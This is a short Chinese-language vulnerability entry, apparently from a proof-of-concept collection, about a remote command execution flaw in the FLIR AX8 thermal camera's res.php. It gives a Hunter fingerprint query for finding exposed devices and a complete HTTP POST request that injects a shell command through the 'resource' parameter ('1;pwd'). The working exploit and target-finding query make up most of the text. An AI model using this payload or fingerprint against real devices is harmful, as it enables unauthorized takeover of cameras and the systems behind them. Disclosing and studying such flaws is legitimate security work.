# FLIR-AX8热成像仪res.php存在远程命令执行漏洞

FLIR-AX8热成像仪res.php存在远程命令执行漏洞，允许攻击者在目标服务器上执行任意系统命令，可能导致服务器被完全控制、数据泄露或破坏，严重威胁系统安全。

## hunter

```javascript
web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
```

## poc

```javascript
POST /res.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: *****
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

action=node&resource=1;pwd
```

![image-20240927202446271](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272024333.png)
